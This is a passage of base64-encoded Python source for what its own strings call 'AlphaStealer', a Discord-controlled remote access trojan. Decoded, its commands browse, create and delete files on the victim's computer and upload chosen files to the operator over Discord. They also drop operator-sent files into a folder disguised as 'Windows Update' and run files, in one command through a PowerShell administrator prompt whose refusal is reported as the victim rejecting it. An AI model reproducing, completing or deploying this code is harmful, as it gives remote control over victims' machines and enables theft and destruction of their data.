bHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nbHMnKQ0KYXN5bmMgZGVmIGxzKGN0eCk6DQogICAgdHJ5Og0KICAgICAgICBjb250ZW5pZG8gPSBvcy5saXN0ZGlyKCcuJykNCiAgICAgICAgc2FsaWRhID0gJ1xuJy5qb2luKGNvbnRlbmlkbykNCg0KICAgICAgICB3aXRoIG9wZW4oIm91dHB1dC50eHQiLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgICAgICAgICBmLndyaXRlKHNhbGlkYSkNCg0KICAgICAgICBhd2FpdCBjdHguc2VuZChmaWxlPWRpc2NvcmQuRmlsZSgib3V0cHV0LnR4dCIpKQ0KDQogICAgICAgIG9zLnJlbW92ZSgib3V0cHV0LnR4dCIpDQoNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGYi4p2MIEVycm9yOiB7ZX0iKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nY2QnKQ0KYXN5bmMgZGVmIGNkKGN0eCwgKiwgcGF0aDogc3RyID0gTm9uZSk6DQogICAgaWYgbm90IHBhdGg6DQogICAgICAgIHJldHVybiBhd2FpdCBjdHguc2VuZCgiYGBg8J+TgSBVc2U6IC5jZCA8cGF0aCBvciAuLj5gYGAiKQ0KICAgIHRyeToNCiAgICAgICAgb3MuY2hkaXIocGF0aCkNCiAgICAgICAgbnVldm9fcGF0aCA9IG9zLmdldGN3ZCgpDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZidEaXJlY3RvcnkgQ2hhbmdlZDogYGBge251ZXZvX3BhdGh9YGBgJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ1RoaXMgZGlyZWN0b3J5IGRvZXMgbm90IGV4aXN0LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgTm90QURpcmVjdG9yeUVycm9yOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnSXMgYSBmaWxlLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnVGhpcyBkaXJlY3RvcnkgaXMgZm9yIGFkbWluaXN0cmF0b3JzIG9ubHkuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ0Vycm9yIDQwNCcsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J21kJykNCmFzeW5jIGRlZiBtZChjdHgsICosIGZvbGRlcl9uYW1lOiBzdHIgPSBOb25lKToNCiAgICBpZiBub3QgZm9sZGVyX25hbWU6DQogICAgICAgIHJldHVybiBhd2FpdCBjdHguc2VuZCgiYGBg8J+TgSBVc2U6IC5tZCA8Zm9sZGVyIG5hbWU+YGBgIikNCiAgICB0cnk6DQogICAgICAgIHBhdGggPSBvcy5wYXRoLmpvaW4ob3MuZ2V0Y3dkKCksIGZvbGRlcl9uYW1lKQ0KICAgICAgICBvcy5ta2RpcihwYXRoKQ0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnRm9sZGVyIGNyZWF0ZWQgd2l0aCB0aGUgbmFtZSB7Zm9sZGVyX25hbWV9LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgRmlsZUV4aXN0c0Vycm9yOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUaGUgZm9sZGVyIGFscmVhZHkgZXhpc3RzLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdZb3UgZG8gbm90IGhhdmUgcGVybWlzc2lvbnMgdG8gY3JlYXRlIHRoZSBmb2xkZXIuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGU6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0Vycm9yIGNyZWF0aW5nIGZvbGRlci4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCkBib3QuY29tbWFuZChuYW1lPSdjcmV0ZScpDQphc3luYyBkZWYgY3JlYXRlKGN0eCwgKiwgZmlsZW5hbWU6IHN0ciA9IE5vbmUpOg0KICAgIGlmIG5vdCBmaWxlbmFtZToNCiAgICAgICAgcmV0dXJuIGF3YWl0IGN0eC5zZW5kKCJgYGDwn5OEIFVzZTogLmNyZWF0ZSA8ZmlsZW5hbWU+YGBgIikNCg0KICAgIHBhdGggPSBvcy5wYXRoLmpvaW4ob3MuZ2V0Y3dkKCksIGZpbGVuYW1lKQ0KDQogICAgaWYgb3MucGF0aC5leGlzdHMocGF0aCk6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1RoZSBmaWxlIGFscmVhZHkgZXhpc3RzLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICByZXR1cm4gYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCiAgICB0cnk6DQogICAgICAgIHdpdGggb3BlbihwYXRoLCAndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZidGaWxlIGNyZWF0ZWQgd2l0aCB0aGUgbmFtZSB7ZmlsZW5hbWV9LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdPbmx5IGZpbGVzIHdpdGggYWRtaW5pc3RyYXRvciBwZXJtaXNzaW9ucyBjYW4gYmUgY3JlYXRlZCBpbiB0aGlzIGRpcmVjdG9yeS4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZXhjZXB0IE9TRXJyb3IgYXMgZToNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nRXJyb3IgNDA0JywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ncm0nKQ0KYXN5bmMgZGVmIHJtKGN0eCwgKiwgZmlsZW5hbWU6IHN0ciA9IE5vbmUpOg0KICAgIGlmIG5vdCBmaWxlbmFtZToNCiAgICAgICAgcmV0dXJuIGF3YWl0IGN0eC5zZW5kKCJgYGDwn5OEIFVzZTogLnJtIDxmaWxlbmFtZT5gYGAiKQ0KDQogICAgcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgZmlsZW5hbWUpDQoNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1RoZSBmaWxlIGFscmVhZHkgZXhpc3RzLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICByZXR1cm4gYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgdHJ5Og0KICAgICAgICBvcy5yZW1vdmUocGF0aCkNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ0ZpbGUgZGVsZXRlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nT25seSBmaWxlcyB3aXRoIGFkbWluaXN0cmF0b3IgcGVybWlzc2lvbnMgY2FuIGJlIGRlbGV0ZWQgaW4gdGhpcyBkaXJlY3RvcnkuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGU6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0Vycm9yIDQwNCcsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3JtZGlyJykNCmFzeW5jIGRlZiBybWRpcihjdHgsICosIGZvbGRlcm5hbWU6IHN0ciA9IE5vbmUpOg0KICAgIGlmIG5vdCBmb2xkZXJuYW1lOg0KICAgICAgICByZXR1cm4gYXdhaXQgY3R4LnNlbmQoImBgYPCfk4EgVXNhZ2U6IC5ybWRpciA8Zm9sZGVybmFtZT5gYGAiKQ0KDQogICAgcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgZm9sZGVybmFtZSkNCg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdFcnJvcicsIGRlc2NyaXB0aW9uPSdUaGUgZm9sZGVyIGRvZXMgbm90IGV4aXN0LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICByZXR1cm4gYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCiAgICB0cnk6DQogICAgICAgIHNodXRpbC5ybXRyZWUocGF0aCkNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ0ZvbGRlciBkZWxldGVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdZb3UgZG8gbm90IGhhdmUgcGVybWlzc2lvbiB0byBkZWxldGUgdGhpcyBmb2xkZXIuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGU6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZidFcnJvciA0MDQnLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCkBib3QuY29tbWFuZChuYW1lPSd1cGxvYWQnKQ0KYXN5bmMgZGVmIHVwbG9hZChjdHgsICosIGZpbGVwYXRoOiBzdHIgPSBOb25lKToNCiAgICBpZiBub3QgZmlsZXBhdGg6DQogICAgICAgIHJldHVybiBhd2FpdCBjdHguc2VuZCgiYGBg8J+ThCBVc2U6IC51cGxvYWQgPGZpbGVuYW1lIG9yIGZpbGVwYXRoPmBgYCIpDQoNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZmlsZXBhdGgpOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUaGUgZmlsZSBhbHJlYWR5IGV4aXN0cy4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgcmV0dXJuIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIHRyeToNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZmlsZT1kaXNjb3JkLkZpbGUoZmlsZXBhdGgpKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChmIuKchSBGaWxlIHVwbG9hZGVkIGB7ZmlsZXBhdGh9YCBzdWNjZXNzZnVsbHkuIikNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0Vycm9yIDQwNi4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCmRlZiBnZW5lcmF0ZV90cmVlKGRpcmVjdG9yeSwgbGV2ZWw9MCk6DQogICAgIiIiR2VuZXJhdGVzIGEgdHJlZSByZXByZXNlbnRhdGlvbiBvZiB0aGUgZGlyZWN0b3J5LiIiIg0KICAgIHRyZWUgPSAiIg0KICAgIHRyeToNCiAgICAgICAgZm9yIGl0ZW0gaW4gb3MubGlzdGRpcihkaXJlY3RvcnkpOg0KICAgICAgICAgICAgaXRlbV9wYXRoID0gb3MucGF0aC5qb2luKGRpcmVjdG9yeSwgaXRlbSkNCiAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIoaXRlbV9wYXRoKToNCiAgICAgICAgICAgICAgICB0cmVlICs9ICIgICAgIiAqIGxldmVsICsgZiJbRElSXSB7aXRlbX1cbiINCiAgICAgICAgICAgICAgICB0cmVlICs9IGdlbmVyYXRlX3RyZWUoaXRlbV9wYXRoLCBsZXZlbCArIDEpICAjIFJlY3Vyc2UgaW50byBzdWJkaXJlY3RvcnkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdHJlZSArPSAiICAgICIgKiBsZXZlbCArIGYie2l0ZW19XG4iDQogICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoNCiAgICAgICAgdHJlZSArPSAiICAgICIgKiBsZXZlbCArICJbUEVSTUlTU0lPTiBFUlJPUl0gVW5hYmxlIHRvIGFjY2VzcyB0aGlzIGZvbGRlci5cbiINCiAgICByZXR1cm4gdHJlZQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ndHJlZScpDQphc3luYyBkZWYgdHJlZShjdHgpOg0KICAgIHRyeToNCiAgICAgICAgY3VycmVudF9kaXJlY3RvcnkgPSBvcy5nZXRjd2QoKQ0KDQogICAgICAgIHRyZWVfcmVwcmVzZW50YXRpb24gPSBnZW5lcmF0ZV90cmVlKGN1cnJlbnRfZGlyZWN0b3J5KQ0KDQogICAgICAgIHdpdGggb3Blbigib3V0cHV0LnR4dCIsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoNCiAgICAgICAgICAgIGYud3JpdGUodHJlZV9yZXByZXNlbnRhdGlvbikNCg0KICAgICAgICBhd2FpdCBjdHguc2VuZChmaWxlPWRpc2NvcmQuRmlsZSgib3V0cHV0LnR4dCIpKQ0KDQogICAgICAgIG9zLnJlbW92ZSgib3V0cHV0LnR4dCIpDQoNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0Vycm9yIDQwNCcsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2Rvd25sb2FkJykNCmFzeW5jIGRlZiBkb3dubG9hZChjdHgpOg0KICAgIHJvYW1pbmdfcGF0aCA9IG9zLmVudmlyb24uZ2V0KCdBUFBEQVRBJykNCiAgICB0YXJnZXRfZm9sZGVyID0gb3MucGF0aC5qb2luKHJvYW1pbmdfcGF0aCwgIldpbmRvd3MgVXBkYXRlIikNCg0KICAgIGlmIG5vdCBjdHgubWVzc2FnZS5hdHRhY2htZW50czoNCiAgICAgICAgcmV0dXJuIGF3YWl0IGN0eC5zZW5kKCLwn5OOIFBsZWFzZSB1cGxvYWQgYSBmaWxlIHdpdGggdGhlIGNvbW1hbmQuIFVzYWdlOiBgLmRvd25sb2FkYCArIGF0dGFjaCBmaWxlLiIpDQoNCiAgICBhdHRhY2htZW50ID0gY3R4Lm1lc3NhZ2UuYXR0YWNobWVudHNbMF0NCiAgICBmaWxlX3VybCA9IGF0dGFjaG1lbnQudXJsDQogICAgZmlsZV9uYW1lID0gYXR0YWNobWVudC5maWxlbmFtZQ0KDQogICAgcm9hbWluZ19wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ0FQUERBVEEnXSwgJ1dpbmRvd3MgVXBkYXRlJywgZmlsZV9uYW1lKQ0KDQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHRhcmdldF9mb2xkZXIpOg0KICAgICAgICBvcy5tYWtlZGlycyh0YXJnZXRfZm9sZGVyKQ0KDQogICAgdHJ5Og0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmaWxlX3VybCkNCiAgICAgICAgcmVzcG9uc2UucmFpc2VfZm9yX3N0YXR1cygpDQoNCiAgICAgICAgd2l0aCBvcGVuKHJvYW1pbmdfcGF0aCwgJ3diJykgYXMgZjoNCiAgICAgICAgICAgIGYud3JpdGUocmVzcG9uc2UuY29udGVudCkNCg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYn4pyFIEZpbGUgYHtmaWxlX25hbWV9YCBkb3dubG9hZGVkIHRvIGBDOlxcVXNlcnNcXHt1c2VybmFtZX1cXEFwcERhdGFcXFJvYW1pbmdcXFdpbmRvd3MgVXBkYXRlYC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdFcnJvciA0MDQnLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCmRlZiBvcGVuX2ZpbGUoZmlsZXBhdGgsIGN0eCk6DQogICAgdHJ5Og0KICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZmlsZXBhdGgpOg0KICAgICAgICAgICAgcmVzcG9uc2UgPSBmIuKdjCBUaGUgZmlsZSBge2ZpbGVwYXRofWAgZG9lcyBub3QgZXhpc3QuIg0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgb3Muc3RhcnRmaWxlKGZpbGVwYXRoKQ0KICAgICAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nRmlsZSBleGVjdXRlZCBzdWNjZXNzZGZ1bGx5LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgICAgIHJlc3BvbnNlID0gZW1iZWQ9ZW1iZWQNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0Vycm9yIDQwNC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgcmVzcG9uc2UgPSBlbWJlZD1lbWJlZA0KDQogICAgY29ybyA9IGN0eC5zZW5kKHJlc3BvbnNlKQ0KICAgIGRpc2NvcmQudXRpbHMuZW5zdXJlX2Z1dHVyZShjb3JvKQ0KDQpkZWYgb3Blbl9maWxlX2FkbWluKGZpbGVwYXRoLCBjdHgsIGxvb3ApOg0KICAgIHRyeToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGZpbGVwYXRoKToNCiAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZidUaGUgZmlsZSBge2ZpbGVwYXRofWAgZG9lcyBub3QgZXhpc3QuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJ3Bvd2Vyc2hlbGwnLCAnLUNvbW1hbmQnLCBmJ1N0YXJ0LVByb2Nlc3MgIntmaWxlcGF0aH0iIC1WZXJiIFJ1bkFzJ10sIHNoZWxsPVRydWUpDQogICAgICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdGaWxlIGV4ZWN1dGVkIGFzIGFkbWluaXN0cmF0b3Igc3VjY2Vzc2Z1bGx5LicsIGNvbG9yPTB4RkYwMDAwKQ0KDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUaGUgdmljdGltIHJlamVjdGVkIHRoZSBhZG1pbmlzdHJhdG9yIHJlcXVlc3QuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQoNCiAgICBhc3luY2lvLnJ1bl9jb3JvdXRpbmVfdGhyZWFkc2FmZShjdHguc2VuZChlbWJlZD1lbWJlZCksIGxvb3ApDQoNCkBib3QuY29tbWFuZChuYW1lPSdleGVjdXRlJykNCmFzeW5jIGRlZiBleGVjdXRlKGN0eCwgKiwgZmlsZXBhdGg6IHN0cik6DQogICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGZpbGVwYXRoKToNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tbmFkIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nVGhlIGZpbGUgZG9lcyBub3QgZXhpc3QuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkI